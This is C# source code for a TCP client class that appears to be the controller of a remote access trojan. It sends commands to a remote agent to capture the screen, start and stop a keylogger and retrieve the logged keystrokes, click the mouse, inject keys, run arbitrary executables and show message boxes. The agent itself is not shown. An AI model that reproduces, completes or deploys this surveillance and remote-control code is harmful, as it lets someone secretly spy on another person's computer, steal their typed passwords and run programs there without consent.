using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Drawing;



namespace ClientDll
{
    public class TCPClient : AbstractClient, IDisposable
    {
        TcpClient myclient;
        private NetworkStream networkStream;
        private StreamReader streamReader;
        private StreamWriter streamWriter;
        bool dispose = false;

        public TCPClient(string port):base(port)
        {
        }

        public  bool ConnectToServer2(string serverAddress)
        {
            try
            {
                myclient = new TcpClient(serverAddress, int.Parse(this.Port));
                myclient.Connect(serverAddress, int.Parse(this.Port));
            }
            catch
            {
                return false;
            }
            return true;
        }


        public override bool ConnectToServer(string serverAddress)
        {
            try
            {
                myclient = new TcpClient(serverAddress,int.Parse(this.Port));
                networkStream = myclient.GetStream();
                streamReader = new StreamReader(networkStream);
                streamWriter = new StreamWriter(networkStream);
            }
            catch
            {
                return false;
            }
            return true;
        }


        public override System.Drawing.Image GetScreen()
        {
            Image img = null;
            try
            {
                streamWriter.WriteLine("img^io");
                byte[] buffer = new byte[950000];

                streamWriter.Flush();
                int rtn = streamReader.BaseStream.Read(buffer, 0, buffer.Length - 1);

                using (MemoryStream stream = new MemoryStream(buffer))
                {
                    img = Image.FromStream(stream);
                }
            }
            catch (Exception ee)
            {
                img = null;
            }

            return img;

        }

        public override string SendMessage(object  message)
        {
            string response = string.Empty;
            try
            {
                streamWriter.WriteLine(message);
                streamWriter.Flush();
                response  = streamReader.ReadLine();
            }
            catch (Exception ee)
            {
                response = "error";
            }
            return response;
        }

        ~TCPClient()
        {
            if (!dispose && streamReader != null)
            {
                streamReader.Close();
                streamReader.Dispose();
                streamWriter.Close();
                streamWriter.Dispose();
                networkStream.Close();
                networkStream.Dispose();
            }
        }

        public override void Dispose(bool dispose)
        {
            Dispose();
        }

        public void Dispose()
        {
            
            streamReader.Close();
            streamReader.Dispose();
            streamWriter.Close();
            streamWriter.Dispose();
            networkStream.Close();
            networkStream.Dispose();
            dispose = true;
            GC.SuppressFinalize(this);

        }


        public override bool DisConnectServer()
        {
            myclient.Close();
            return true;
        }

        public override bool StartKeylog()
        {
            SendMessage("startkeylog^io");
            return true;
        }

        public override bool Stopkeylog()
        {
            SendMessage("stopkeylog^io");
            return true;
        }

        public override string  Getkey()
        {
           return SendMessage("getkey^io");
        }

        public override bool MouseClickLeft(int x, int y )
        {
            SendMessage("mouseclickleft^" + x.ToString() + "^" + y.ToString());
            return true;
        }

        public override bool MouseClickRight(int x, int y)
        {
            SendMessage("mouseclickright^" + x.ToString() + "^" + y.ToString());
            return true;
        }

        public override bool RunExe(string exe)
        {
            SendMessage("exe^" + exe);
            return true;
        }

        public override bool ShowMessageBox(string message)
        {
            SendMessage("message^"+ message);
            return true;
        }

        public override bool SendKey(string key)
        {
            SendMessage("keyup^" + key);
            return true;
        }

    }
}
